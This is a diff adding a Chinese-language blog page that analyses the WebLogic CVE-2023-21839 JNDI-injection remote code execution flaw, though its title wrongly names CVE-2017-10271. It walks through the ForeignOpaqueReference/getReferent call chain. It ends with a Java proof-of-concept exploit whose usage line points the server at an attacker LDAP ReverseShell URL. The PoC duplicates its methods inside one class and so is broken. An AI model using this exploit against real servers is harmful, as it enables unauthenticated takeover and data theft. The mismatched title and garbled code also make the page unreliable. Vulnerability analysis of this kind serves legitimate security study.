@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CVE-2023-21839WebLogic 存在远程代码执行漏洞（CVE-2023-21839&#x2F;CNVD-2023-04389），由于Weblogic IIOP&#x2F;T3协议存在缺陷，当IIOP&#x2F;T3协议开启时，允许未经身份验证的攻击者通过IIOP&#x2F;T3协议网络访问攻击存在安全风险的WebLogic Server，漏洞利用成功WebLogic Server可能">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现">
+<meta property="og:url" content="https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/index.html">
+<meta property="og:site_name" content="g0dam">
+<meta property="og:description" content="CVE-2023-21839WebLogic 存在远程代码执行漏洞（CVE-2023-21839&#x2F;CNVD-2023-04389），由于Weblogic IIOP&#x2F;T3协议存在缺陷，当IIOP&#x2F;T3协议开启时，允许未经身份验证的攻击者通过IIOP&#x2F;T3协议网络访问攻击存在安全风险的WebLogic Server，漏洞利用成功WebLogic Server可能">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-03-24T08:48:10.000Z">
+<meta property="article:modified_time" content="2025-03-26T01:11:46.998Z">
+<meta property="article:author" content="g0dam">
+<meta property="article:tag" content="CVE">
+<meta property="article:tag" content="WebLogic">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="g0dam" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/idea/">Idea</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/19/algorithm/dpalgorithm/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&text=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&title=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&is_video=false&description=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现&body=Check out this article: https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&title=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&title=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&title=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&title=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&name=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&t=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2023-21839"><span class="toc-number">1.</span> <span class="toc-text">CVE-2023-21839</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-Step-1%EF%BC%9A%E6%A0%B8%E5%BF%83%E7%B1%BB%E7%BB%93%E6%9E%84"><span class="toc-number">1.1.</span> <span class="toc-text">🔹 Step 1：核心类结构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%A7%B1-OpaqueReference-%E6%8E%A5%E5%8F%A3"><span class="toc-number">1.1.1.</span> <span class="toc-text">🧱 OpaqueReference 接口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%A7%B1-ForeignOpaqueReference-%E7%B1%BB"><span class="toc-number">1.1.2.</span> <span class="toc-text">🧱 ForeignOpaqueReference 类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-Step-2%EF%BC%9A%E5%A6%82%E4%BD%95%E8%B0%83%E7%94%A8-getReferent-%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">🔹 Step 2：如何调用 getReferent()？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">1.3.</span> <span class="toc-text">POC</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">g0dam</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-24T08:48:10.000Z" class="dt-published" itemprop="datePublished">2025-03-24</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Web-Security/">Web Security</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CVE/" rel="tag">CVE</a>, <a class="p-category" href="/tags/WebLogic/" rel="tag">WebLogic</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="CVE-2023-21839"><a href="#CVE-2023-21839" class="headerlink" title="CVE-2023-21839"></a>CVE-2023-21839</h2><p>WebLogic 存在远程代码执行漏洞（CVE-2023-21839&#x2F;CNVD-2023-04389），由于Weblogic IIOP&#x2F;T3协议存在缺陷，当IIOP&#x2F;T3协议开启时，允许未经身份验证的攻击者通过IIOP&#x2F;T3协议网络访问攻击存在安全风险的WebLogic Server，漏洞利用成功WebLogic Server可能被攻击者接管执行任意命令导致服务器沦陷或者造成严重的敏感数据泄露。</p>
+<p>由于Weblogic t3&#x2F;iiop协议支持远程绑定对象bind到服务端，并且可以通过lookup查看，当远程对象继承自OpaqueReference时，lookup查看远程对象，服务端会调用远程对象getReferent方法。weblogic.deployment.jms.ForeignOpaqueReference继承自OpaqueReference并且实现了getReferent方法，并且存在retVal &#x3D; context.lookup(this.remoteJNDIName)实现，故可以通过rmi&#x2F;ldap远程协议进行远程命令执行。</p>
+<p>我们按调用链顺序来解析：</p>
+<hr>
+<h3 id="🔹-Step-1：核心类结构"><a href="#🔹-Step-1：核心类结构" class="headerlink" title="🔹 Step 1：核心类结构"></a>🔹 Step 1：核心类结构</h3><h4 id="🧱-OpaqueReference-接口"><a href="#🧱-OpaqueReference-接口" class="headerlink" title="🧱 OpaqueReference 接口"></a>🧱 <code>OpaqueReference</code> 接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OpaqueReference</span> &#123;</span><br><span class="line">    Object <span class="title function_">getReferent</span><span class="params">(Name var1, Context var2)</span> <span class="keyword">throws</span> NamingException;</span><br><span class="line">    String <span class="title function_">toString</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>WebLogic 中定义的接口，用于表示一种“可引用的远程资源”。</li>
+</ul>
+<h4 id="🧱-ForeignOpaqueReference-类"><a href="#🧱-ForeignOpaqueReference-类" class="headerlink" title="🧱 ForeignOpaqueReference 类"></a>🧱 <code>ForeignOpaqueReference</code> 类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForeignOpaqueReference</span> <span class="keyword">implements</span> <span class="title class_">OpaqueReference</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> Hashtable jndiEnvironment;</span><br><span class="line">    <span class="keyword">private</span> String remoteJNDIName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ForeignOpaqueReference</span><span class="params">(String remoteJNDIName, Hashtable env)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.remoteJNDIName = remoteJNDIName;</span><br><span class="line">        <span class="built_in">this</span>.jndiEnvironment = env;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getReferent</span><span class="params">(Name name, Context ctx)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        InitialContext context;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.jndiEnvironment == <span class="literal">null</span>) &#123;</span><br><span class="line">            context = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            context = <span class="keyword">new</span> <span class="title class_">InitialContext</span>(<span class="built_in">this</span>.jndiEnvironment);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">retVal</span> <span class="operator">=</span> context.lookup(<span class="built_in">this</span>.remoteJNDIName);  <span class="comment">// 🚨 漏洞触发点</span></span><br><span class="line">        context.close();</span><br><span class="line">        <span class="keyword">return</span> retVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>这里就是关键点：<code>getReferent()</code> 方法会直接使用 remoteJNDIName 发起远程查询</strong>，而我们可以控制这个地址！</p>
+</blockquote>
+<hr>
+<h3 id="🔹-Step-2：如何调用-getReferent-？"><a href="#🔹-Step-2：如何调用-getReferent-？" class="headerlink" title="🔹 Step 2：如何调用 getReferent()？"></a>🔹 Step 2：如何调用 <code>getReferent()</code>？</h3><p>调用发生在 WebLogic 的 <code>WLNamingManager</code> 类中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">WLNamingManager</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object boundObject, Name name, Context ctx, Hashtable env)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (boundObject <span class="keyword">instanceof</span> OpaqueReference) &#123;</span><br><span class="line">            boundObject = ((OpaqueReference)boundObject).getReferent(name, ctx); <span class="comment">// ☣️ 触发点</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要传入的对象实现了 <code>OpaqueReference</code> 接口，WebLogic 就会自动调用它的 <code>getReferent()</code> 方法 —— 而这在内部是<strong>完全自动发生的</strong>，不需要攻击者手动触发。</p>
+<hr>
+<p>🧪 利用原理</p>
+<p>攻击者可以：</p>
+<ol>
+<li><p><strong>构造一个 <code>ForeignOpaqueReference</code> 实例</strong>，其内部：</p>
+<ul>
+<li><code>remoteJNDIName</code> 设置为一个攻击者控制的 LDAP&#x2F;RMI 地址</li>
+<li><code>jndiEnvironment</code> 指定了使用什么 JNDI 工厂（如 <code>com.sun.jndi.rmi.registry.RegistryContextFactory</code>）</li>
+</ul>
+</li>
+<li><p><strong>将这个对象通过 <code>bind()</code> 方法绑定到 WebLogic 的 JNDI 服务中</strong></p>
+</li>
+<li><p><strong>调用 <code>lookup()</code> 获取该对象时，WebLogic 会自动调用 <code>getObjectInstance()</code> → <code>getReferent()</code></strong></p>
+</li>
+<li><p><strong><code>getReferent()</code> 方法内部执行远程 JNDI 查询</strong>，触发 WebLogic 去攻击者的服务器加载恶意类或反序列化对象</p>
+</li>
+<li><p>💥 <strong>远程代码执行（RCE）成功</strong></p>
+</li>
+</ol>
+<hr>
+<p>📌 关键点分析</p>
+<table>
+<thead>
+<tr>
+<th>位置</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ForeignOpaqueReference</code></td>
+<td>这是实现 <code>OpaqueReference</code> 的类，允许构造带 JNDI 的远程引用</td>
+</tr>
+<tr>
+<td><code>getReferent()</code></td>
+<td>漏洞方法，自动发起远程 lookup</td>
+</tr>
+<tr>
+<td><code>jndiEnvironment</code></td>
+<td>可以指定加载方式，如 RMI 或 LDAP</td>
+</tr>
+<tr>
+<td><code>remoteJNDIName</code></td>
+<td>攻击者控制的远程地址</td>
+</tr>
+<tr>
+<td><code>WLNamingManager.getObjectInstance()</code></td>
+<td>在 JNDI lookup 中会自动触发 <code>getReferent()</code></td>
+</tr>
+<tr>
+<td><code>context.lookup()</code></td>
+<td>发起远程访问，加载恶意对象，最终执行攻击者代码</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2023_21839</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> String JNDI_FACTORY=<span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> String HOW_TO_USE=<span class="string">&quot;[*]java -jar 目标ip:端口 ldap地址\ne.g. java -jar 192.168.220.129:7001 ldap://192.168.31.58:1389/Basic/ReverseShell/192.168.220.129/1111&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title function_">getInitialContext</span><span class="params">(String url)</span><span class="keyword">throws</span> NamingException</span><br><span class="line">&#123;</span><br><span class="line">    Hashtable&lt;String,String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String,String&gt;();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">    env.put(Context.PROVIDER_URL, url);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span>(args.length &lt;<span class="number">2</span>)&#123;</span><br><span class="line">        System.out.println(HOW_TO_USE);</span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">t3Url</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">    <span class="type">String</span> <span class="variable">ldapUrl</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line">    InitialContext c=getInitialContext(<span class="string">&quot;t3://&quot;</span>+t3Url);</span><br><span class="line">    Hashtable&lt;String,String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String,String&gt;();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">    weblogic.deployment.jms.ForeignOpaqueReference f=<span class="keyword">new</span> <span class="title class_">weblogic</span>.deployment.jms.ForeignOpaqueReference();</span><br><span class="line">    Field jndiEnvironment=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(<span class="string">&quot;jndiEnvironment&quot;</span>);</span><br><span class="line">    jndiEnvironment.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    jndiEnvironment.set(f,env);</span><br><span class="line">    Field remoteJNDIName=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(<span class="string">&quot;remoteJNDIName&quot;</span>);</span><br><span class="line">    remoteJNDIName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    remoteJNDIName.set(f,ldapUrl);</span><br><span class="line">    <span class="type">String</span> <span class="variable">bindName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>(System.currentTimeMillis()).nextLong()+<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        c.bind(bindName,f);</span><br><span class="line">        c.lookup(bindName);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123; &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title function_">getInitialContext</span><span class="params">(String url)</span><span class="keyword">throws</span> NamingException</span><br><span class="line">&#123;</span><br><span class="line">    Hashtable&lt;String,String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String,String&gt;();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">    env.put(Context.PROVIDER_URL, url);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span>(args.length &lt;<span class="number">2</span>)&#123;</span><br><span class="line">        System.out.println(HOW_TO_USE);</span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">t3Url</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">    <span class="type">String</span> <span class="variable">ldapUrl</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line">    InitialContext c=getInitialContext(<span class="string">&quot;t3://&quot;</span>+t3Url);</span><br><span class="line">    Hashtable&lt;String,String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String,String&gt;();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">    weblogic.deployment.jms.ForeignOpaqueReference f=<span class="keyword">new</span> <span class="title class_">weblogic</span>.deployment.jms.ForeignOpaqueReference();</span><br><span class="line">    Field jndiEnvironment=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(<span class="string">&quot;jndiEnvironment&quot;</span>);</span><br><span class="line">    jndiEnvironment.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    jndiEnvironment.set(f,env);</span><br><span class="line">    Field remoteJNDIName=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(<span class="string">&quot;remoteJNDIName&quot;</span>);</span><br><span class="line">    remoteJNDIName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    remoteJNDIName.set(f,ldapUrl);</span><br><span class="line">    <span class="type">String</span> <span class="variable">bindName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>(System.currentTimeMillis()).nextLong()+<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        c.bind(bindName,f);</span><br><span class="line">        c.lookup(bindName);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123; &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/idea/">Idea</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2023-21839"><span class="toc-number">1.</span> <span class="toc-text">CVE-2023-21839</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-Step-1%EF%BC%9A%E6%A0%B8%E5%BF%83%E7%B1%BB%E7%BB%93%E6%9E%84"><span class="toc-number">1.1.</span> <span class="toc-text">🔹 Step 1：核心类结构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%A7%B1-OpaqueReference-%E6%8E%A5%E5%8F%A3"><span class="toc-number">1.1.1.</span> <span class="toc-text">🧱 OpaqueReference 接口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%A7%B1-ForeignOpaqueReference-%E7%B1%BB"><span class="toc-number">1.1.2.</span> <span class="toc-text">🧱 ForeignOpaqueReference 类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-Step-2%EF%BC%9A%E5%A6%82%E4%BD%95%E8%B0%83%E7%94%A8-getReferent-%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">🔹 Step 2：如何调用 getReferent()？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">1.3.</span> <span class="toc-text">POC</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
